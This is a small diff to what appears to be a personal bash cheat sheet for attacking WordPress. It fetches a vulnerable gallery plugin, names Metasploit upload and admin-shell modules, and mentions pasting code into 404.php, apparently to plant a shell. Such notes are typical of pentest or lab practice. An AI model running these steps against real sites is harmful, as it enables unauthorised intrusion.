@@ -1,7 +1,7 @@
 #!/bin/bash
 
 #Plugin Upload
-wget https://www.exploit-db.com/raw/36374
+wget https://exploit-db.com/apps/ad33afbc2f2e22877b202d986acd43bd-reflex-gallery.zip
 use exploit/unix/webapp/wp_slideshowgallery_upload
 use exploit/unix/webapp/wp_reflexgallery_file_upload
 
@@ -13,4 +13,6 @@ paste the code at 404.php
 
 #Metasploit exploit
 use exploit/unix/webapp/wp_admin_shell_upload
+
+
 
